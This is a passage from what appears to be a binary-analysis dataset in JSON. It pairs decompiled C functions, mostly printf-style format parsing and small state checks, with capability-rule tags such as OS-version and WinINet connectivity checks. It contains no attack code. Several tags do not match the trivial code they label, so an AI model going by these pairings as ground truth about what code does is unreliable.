                            *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                            }\n                        }\n                        else {\n                            *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                            piVar3[2] = piVar3[2] + 1;\n                            ***ppiVar1 = uVar2;\n                            **ppiVar1 = **ppiVar1 + 2;\n                        }\n                        break;\n                    case 1:\n                        *(param_1 + 0x24) = 0xffffffff;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x1c) = 0;\n                        *(param_1 + 0x28) = 0;\n                        *(param_1 + 0x38) = 0;\n                        break;\n                    case 2:\n                        if (arg_8h == 0x20) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                        }\n                        else if (arg_8h == 0x23) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                        }\n                        else if (arg_8h == 0x2b) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                        }\n                        else if (arg_8h == 0x2d) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                        }\n                        else if (arg_8h == 0x30) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                        }\n                        break;\n                    case 3:\n                        if (uVar2 != 0x2a) {\n                            iVar6 = param_1 + 0x20;\n                            goto code_r0x0044a5ac;\n                        }\n                        piVar3 = *(param_1 + 0x10);\n                        *(param_1 + 0x10) = piVar3 + 1;\n                        iVar6 = *piVar3;\n                        *(param_1 + 0x20) = iVar6;\n                        if (iVar6 < 0) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            *(param_1 + 0x20) = -iVar6;\n                        }\ncode_r0x0044a5d1:\n                        cVar4 = '\\x01';\n                        goto code_r0x0044a60f;\n                    case 4:\n                        *(param_1 + 0x24) = 0;\n                        break;\n                    case 5:\n                        if (uVar2 == 0x2a) {\n                            piVar3 = *(param_1 + 0x10);\n                            *(param_1 + 0x10) = piVar3 + 1;\n                            iVar6 = *piVar3;\n                            *(param_1 + 0x24) = iVar6;\n                            if (iVar6 < 0) {\n                                *(param_1 + 0x24) = 0xffffffff;\n                            }\n                            goto code_r0x0044a5d1;\n                        }\n                        iVar6 = param_1 + 0x24;\ncode_r0x0044a5ac:\n                        cVar4 = fcn.00448b67(iVar6);\n                        goto code_r0x0044a60f;\n                    case 6:\n                        cVar4 = fcn.0044d0d7();\n                        goto code_r0x0044a60f;\n                    case 7:\n                        cVar4 = fcn.0044f39f();\ncode_r0x0044a60f:\n                        if (cVar4 == '\\0') {\n                            return 0xffffffff;\n                        }\n                        break;\n                    default:\n                        iVar6 = *(param_1 + 8);\n                        *(iVar6 + 0x1c) = 1;\n                        *(iVar6 + 0x18) = 0x16;\n                        goto code_r0x0044a481;\n                    case 0xbad1abe1:\n                        goto code_r0x0044a494;\n                    }\n                    uVar2 = **(param_1 + 0xc);\n                    puVar7 = *(param_1 + 0xc) + 1;\n                    *(param_1 + 0xc) = puVar7;\n                    *(param_1 + 0x2e) = uVar2;\n                }\n                if ((*(param_1 + 0x18) != '\\0') && (*(param_1 + 0x18) != '\\a')) break;\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                iVar6 = *(param_1 + 0x450);\n            } while( true );\n        }\n        iVar6 = *(param_1 + 8);\n        *(iVar6 + 0x18) = 0x16;\n        *(iVar6 + 0x1c) = 1;\ncode_r0x0044a481:\n        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n    }\ncode_r0x0044a494:\n    return 0xffffffff;\n}\n",
        "token_count": 1722
    },
    "0044a8f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044a8f9(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    uint16_t *puVar6;\n    uint32_t arg_8h;\n    \n    cVar3 = fcn.0045409c(*(param_1 + 8));\n    if (cVar3 != '\\0') {\n        puVar6 = *(param_1 + 0xc);\n        if (puVar6 != NULL) {\n            iVar5 = *(param_1 + 0x450) + 1;\n            *(param_1 + 0x450) = iVar5;\n            do {\n                if (iVar5 == 2) {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar1 = *puVar6;\n                puVar6 = puVar6 + 1;\n                *(param_1 + 0xc) = puVar6;\n                *(param_1 + 0x2e) = uVar1;\n                while ((uVar1 != 0 && (arg_8h = uVar1,  -1 < *(param_1 + 0x14)))) {\n                    uVar4 = fcn.00447e32(arg_8h, *(param_1 + 0x18));\n                    *(param_1 + 0x18) = uVar4;\n    // switch table (8 cases) at 0x44ab15\n                    switch(uVar4) {\n                    case 0:\n                        *(param_1 + 0x38) = 1;\n                        iVar5 = *(param_1 + 0x448);\n                        if (*(iVar5 + 8) == *(iVar5 + 4)) {\n                            if (*(iVar5 + 0xc) == '\\0') {\n                                iVar5 = -1;\n                            }\n                            else {\n                                iVar5 = *(param_1 + 0x14) + 1;\n                            }\n                            *(param_1 + 0x14) = iVar5;\n                        }\n                        else {\n                            *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                            *(iVar5 + 8) = *(iVar5 + 8) + 1;\n                            ***(param_1 + 0x448) = uVar1;\n                            piVar2 = *(param_1 + 0x448);\n                            *piVar2 = *piVar2 + 2;\n                        }\n                        break;\n                    case 1:\n                        *(param_1 + 0x24) = 0xffffffff;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x1c) = 0;\n                        *(param_1 + 0x28) = 0;\n                        *(param_1 + 0x38) = 0;\n                        break;\n                    case 2:\n                        if (arg_8h == 0x20) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                        }\n                        else if (arg_8h == 0x23) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                        }\n                        else if (arg_8h == 0x2b) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                        }\n                        else if (arg_8h == 0x2d) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                        }\n                        else if (arg_8h == 0x30) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                        }\n                        break;\n                    case 3:\n                        if (uVar1 != 0x2a) {\n                            iVar5 = param_1 + 0x20;\n                            goto code_r0x0044aa5c;\n                        }\n                        piVar2 = *(param_1 + 0x10);\n                        *(param_1 + 0x10) = piVar2 + 1;\n                        iVar5 = *piVar2;\n                        *(param_1 + 0x20) = iVar5;\n                        if (iVar5 < 0) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            *(param_1 + 0x20) = -iVar5;\n                        }\ncode_r0x0044aa81:\n                        cVar3 = '\\x01';\n                        goto code_r0x0044aabf;\n                    case 4:\n                        *(param_1 + 0x24) = 0;\n                        break;\n                    case 5:\n                        if (uVar1 == 0x2a) {\n                            piVar2 = *(param_1 + 0x10);\n                            *(param_1 + 0x10) = piVar2 + 1;\n                            iVar5 = *piVar2;\n                            *(param_1 + 0x24) = iVar5;\n                            if (iVar5 < 0) {\n                                *(param_1 + 0x24) = 0xffffffff;\n                            }\n                            goto code_r0x0044aa81;\n                        }\n                        iVar5 = param_1 + 0x24;\ncode_r0x0044aa5c:\n                        cVar3 = fcn.00448c5b(iVar5);\n                        goto code_r0x0044aabf;\n                    case 6:\n                        cVar3 = fcn.0044d3eb();\n                        goto code_r0x0044aabf;\n                    case 7:\n                        cVar3 = fcn.0044fb96();\ncode_r0x0044aabf:\n                        if (cVar3 == '\\0') {\n                            return 0xffffffff;\n                        }\n                        break;\n                    default:\n                        iVar5 = *(param_1 + 8);\n                        *(iVar5 + 0x1c) = 1;\n                        *(iVar5 + 0x18) = 0x16;\n                        goto code_r0x0044a929;\n                    case 0xbad1abe1:\n                        goto code_r0x0044a93c;\n                    }\n                    uVar1 = **(param_1 + 0xc);\n                    puVar6 = *(param_1 + 0xc) + 1;\n                    *(param_1 + 0xc) = puVar6;\n                    *(param_1 + 0x2e) = uVar1;\n                }\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                iVar5 = *(param_1 + 0x450);\n            } while( true );\n        }\n        iVar5 = *(param_1 + 8);\n        *(iVar5 + 0x1c) = 1;\n        *(iVar5 + 0x18) = 0x16;\ncode_r0x0044a929:\n        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n    }\ncode_r0x0044a93c:\n    return 0xffffffff;\n}\n",
        "token_count": 1687
    },
    "0044ac76": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044ac76(int32_t param_1)\n\n{\n    if (*(param_1 + 0x458) == 1) {\n        if (*(param_1 + 0x45c) == 2) {\n            return true;\n        }\n    }\n    else if (*(param_1 + 0x458) == 2) {\n        return *(param_1 + 0x45c) == 0;\n    }\n    return false;\n}\n",
        "token_count": 104
    },
    "0044aca0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044aca0(int32_t param_1)\n\n{\n    if (*(param_1 + 0x458) == 1) {\n        if (*(param_1 + 0x45c) == 2) {\n            return true;\n        }\n    }\n    else if (*(param_1 + 0x458) == 2) {\n        return *(param_1 + 0x45c) == 0;\n    }\n    return false;\n}\n",
        "token_count": 104
    },
    "0044acca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044acca(int32_t param_1)\n\n{\n    if (*(param_1 + 0x458) == 1) {\n        if (*(param_1 + 0x45c) == 2) {\n            return true;\n        }\n    }\n    else if (*(param_1 + 0x458) == 2) {\n        return *(param_1 + 0x45c) == 0;\n    }\n    return false;\n}\n",
        "token_count": 104
    },
    "0044acf4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044acf4(int32_t param_1)\n\n{\n    if (*(param_1 + 0x458) == 1) {\n        if (*(param_1 + 0x45c) == 2) {\n            return true;\n        }\n    }\n    else if (*(param_1 + 0x458) == 2) {\n        return *(param_1 + 0x45c) == 0;\n    }\n    return false;\n}\n",
        "token_count": 104
    },
    "0044b0c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044b0c2(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t var_4h;\n    \n    iVar2 = *(param_1 + 8);\n    *(param_1 + 0x38) = 0;\n    if (*(iVar2 + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    uVar1 = *(param_1 + 0x2d);\n    iVar2 = fcn.00455ad2(**(iVar2 + 0xc), uVar1, 0x8000);\n    if (iVar2 == 0) {\n        var_4h = param_1 & 0xffffff00 | uVar1;\n    }\n    else {\n        fcn.00454e8e(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x14, *(param_1 + 8));\n        uVar1 = **(param_1 + 0xc);\n        *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n        *(param_1 + 0x2d) = uVar1;\n        if (uVar1 == 0) {\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        var_4h = param_1 & 0xffffff00 | uVar1;\n    }\n    fcn.00454e8e(var_4h, param_1 + 0x14, *(param_1 + 8));\n    return 1;\n}\n",
        "token_count": 509
    },
    "0044b247": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044b247(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t var_4h;\n    \n    iVar2 = *(param_1 + 8);\n    *(param_1 + 0x38) = 0;\n    if (*(iVar2 + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    uVar1 = *(param_1 + 0x2d);\n    iVar2 = fcn.00455ad2(**(iVar2 + 0xc), uVar1, 0x8000);\n    if (iVar2 == 0) {\n        var_4h = param_1 & 0xffffff00 | uVar1;\n    }\n    else {\n        fcn.00454e8e(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x14, *(param_1 + 8));\n        uVar1 = **(param_1 + 0xc);\n        *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n        *(param_1 + 0x2d) = uVar1;\n        if (uVar1 == 0) {\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        var_4h = param_1 & 0xffffff00 | uVar1;\n    }\n    fcn.00454e8e(var_4h, param_1 + 0x14, *(param_1 + 8));\n    return 1;\n}\n",
        "token_count": 507
    },
    "004520ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.004520ce(uint *param_1)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t var_4h;\n    \n    var_4h = param_1 & 0xffff0000;\n    *(param_1 + 0xe) = 1;\n    cVar1 = fcn.0043fb45(&var_4h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0044ac3e();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n            if (cVar1 == '\\0') {\n                iVar3 = param_1[2];\n                var_4h = var_4h & 0xffff00ff;\n                if (*(iVar3 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                puVar2 = param_1[0x110];\n                if (param_1[0x110] == NULL) {\n                    puVar2 = param_1 + 0xf;\n                }\n                iVar3 = fcn.0045ee07(puVar2, &var_4h, *(*(iVar3 + 0xc) + 4), iVar3);\n                if (iVar3 < 0) {\n                    *(param_1 + 0xb) = 1;\n                }\n            }\n            else {\n                puVar2 = param_1[0x110];\n                if (param_1[0x110] == NULL) {\n                    puVar2 = param_1 + 0xf;\n                }\n                *puVar2 = var_4h;\n            }\n            puVar2 = param_1 + 0xf;\n            if (param_1[0x110] != NULL) {\n                puVar2 = param_1[0x110];\n            }\n            param_1[0xc] = puVar2;\n            param_1[0xd] = 1;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 502
    },
    "004522e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.004522e9(uint *param_1)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t var_4h;\n    \n    var_4h = param_1 & 0xffff0000;\n    *(param_1 + 0xe) = 1;\n    cVar1 = fcn.0043fbd8(&var_4h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0044ac54();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n            if (cVar1 == '\\0') {\n                iVar3 = param_1[2];\n                var_4h = var_4h & 0xffff00ff;\n                if (*(iVar3 + 0x14) == '\\0') {\n                    fcn.00453bd0();\n                }\n                puVar2 = param_1[0x110];\n                if (param_1[0x110] == NULL) {\n                    puVar2 = param_1 + 0xf;\n                }\n                iVar3 = fcn.0045ee07(puVar2, &var_4h, *(*(iVar3 + 0xc) + 4), iVar3);\n                if (iVar3 < 0) {\n                    *(param_1 + 0xb) = 1;\n                }\n            }\n            else {\n                puVar2 = param_1[0x110];\n                if (param_1[0x110] == NULL) {\n                    puVar2 = param_1 + 0xf;\n                }\n                *puVar2 = var_4h;\n            }\n            puVar2 = param_1 + 0xf;\n            if (param_1[0x110] != NULL) {\n                puVar2 = param_1[0x110];\n            }\n            param_1[0xc] = puVar2;\n            param_1[0xd] = 1;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 503
    },
    "00453444": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00453444(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    iVar1 = *(in_ECX + 8);\n    if (*(iVar1 + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    puVar3 = *(in_ECX + 0x30);\n    iVar4 = 0;\n    if (0 < arg_8h) {\n        do {\n            if (*puVar3 == 0) {\n                return iVar4;\n            }\n            iVar2 = fcn.00455ad2(**(iVar1 + 0xc), *puVar3, 0x8000);\n            if (iVar2 != 0) {\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    return iVar4;\n}\n",
        "token_count": 250
    },
    "00453499": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00453499(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    iVar1 = *(in_ECX + 8);\n    if (*(iVar1 + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    puVar3 = *(in_ECX + 0x30);\n    iVar4 = 0;\n    if (0 < arg_8h) {\n        do {\n            if (*puVar3 == 0) {\n                return iVar4;\n            }\n            iVar2 = fcn.00455ad2(**(iVar1 + 0xc), *puVar3, 0x8000);\n            if (iVar2 != 0) {\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    return iVar4;\n}\n",
        "token_count": 250
    },
    "004534ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004534ee(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    iVar1 = *(in_ECX + 8);\n    if (*(iVar1 + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    puVar3 = *(in_ECX + 0x30);\n    iVar4 = 0;\n    if (0 < arg_8h) {\n        do {\n            if (*puVar3 == 0) {\n                return iVar4;\n            }\n            iVar2 = fcn.00455ad2(**(iVar1 + 0xc), *puVar3, 0x8000);\n            if (iVar2 != 0) {\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    return iVar4;\n}\n",
        "token_count": 250
    },
    "00453543": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00453543(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    iVar1 = *(in_ECX + 8);\n    if (*(iVar1 + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    puVar3 = *(in_ECX + 0x30);\n    iVar4 = 0;\n    if (0 < arg_8h) {\n        do {\n            if (*puVar3 == 0) {\n                return iVar4;\n            }\n            iVar2 = fcn.00455ad2(**(iVar1 + 0xc), *puVar3, 0x8000);\n            if (iVar2 != 0) {\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    return iVar4;\n}\n",
        "token_count": 250
    },
    "00453598": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00453598(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    iVar1 = *(in_ECX + 8);\n    if (*(iVar1 + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    puVar3 = *(in_ECX + 0x30);\n    iVar4 = 0;\n    if (0 < arg_8h) {\n        do {\n            if (*puVar3 == 0) {\n                return iVar4;\n            }\n            iVar2 = fcn.00455ad2(**(iVar1 + 0xc), *puVar3, 0x8000);\n            if (iVar2 != 0) {\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    return iVar4;\n}\n",
        "token_count": 250
    },
    "004535ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004535ed(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    iVar1 = *(in_ECX + 8);\n    if (*(iVar1 + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    puVar3 = *(in_ECX + 0x30);\n    iVar4 = 0;\n    if (0 < arg_8h) {\n        do {\n            if (*puVar3 == 0) {\n                return iVar4;\n            }\n            iVar2 = fcn.00455ad2(**(iVar1 + 0xc), *puVar3, 0x8000);\n            if (iVar2 != 0) {\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    return iVar4;\n}\n",
        "token_count": 250
    },
    "00453825": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00453825(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        puVar1 = *(param_1 + 0x10);\n        *(param_1 + 0x10) = puVar1 + 1;\n        *(param_1 + 0x20) = *puVar1;\n    }\n    else {\n        var_4h = *(param_1 + 0xc);\n        iVar2 = fcn.0043ffcc(*(param_1 + 8), var_4h, &var_4h, 10, 1);\n        iVar2 = iVar2 + -1;\n        *(param_1 + 0xc) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar2) && (*var_4h == '$')) && (iVar2 < 100)) {\n                iVar3 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar2) {\n                    iVar3 = iVar2;\n                }\n                *(param_1 + 0xaa4) = iVar3;\n                uVar4 = fcn.004540cd(param_1 + 0x464 + iVar2 * 0x10, 1, *(param_1 + 0x2d), *(param_1 + 0x28));\n                return uVar4;\n            }\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        *(param_1 + 0x20) = **(param_1 + 0x46c + iVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 488
    },
    "004538fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004538fa(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        puVar1 = *(param_1 + 0x10);\n        *(param_1 + 0x10) = puVar1 + 1;\n        *(param_1 + 0x20) = *puVar1;\n    }\n    else {\n        var_4h = *(param_1 + 0xc);\n        iVar2 = fcn.0043ffcc(*(param_1 + 8), var_4h, &var_4h, 10, 1);\n        iVar2 = iVar2 + -1;\n        *(param_1 + 0xc) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar2) && (*var_4h == '$')) && (iVar2 < 100)) {\n                iVar3 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar2) {\n                    iVar3 = iVar2;\n                }\n                *(param_1 + 0xaa4) = iVar3;\n                uVar4 = fcn.0045412f(param_1 + 0x464 + iVar2 * 0x10, 1, *(param_1 + 0x2d), *(param_1 + 0x28));\n                return uVar4;\n            }\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n            return 0;\n        }\n        *(param_1 + 0x20) = **(param_1 + 0x46c + iVar2 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 489
    },
    "004539cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004539cf(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        puVar1 = *(param_1 + 0x10);\n        *(param_1 + 0x10) = puVar1 + 1;\n        *(param_1 + 0x20) = *puVar1;\n    }\n    else {\n        var_4h = *(param_1 + 0xc);\n        iVar2 = fcn.004401db(*(param_1 + 8), var_4h, &var_4h, 10, 1);\n        iVar2 = iVar2 + -1;\n        *(param_1 + 0xc) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar2) && (*var_4h == 0x24)) && (iVar2 < 100)) {\n                iVar3 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar2) {\n                    iVar3 = iVar2;\n                }\n                *(param_1 + 0xaa4) = iVar3;\n                uVar4 = fcn.00454191(param_1 + 0x464 + iVar2 * 0x10, 1, *(param_1 + 0x2e), *(param_1 + 0x28));\n                return uVar4;\n            }\n            iVar2 = *(param_1 + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            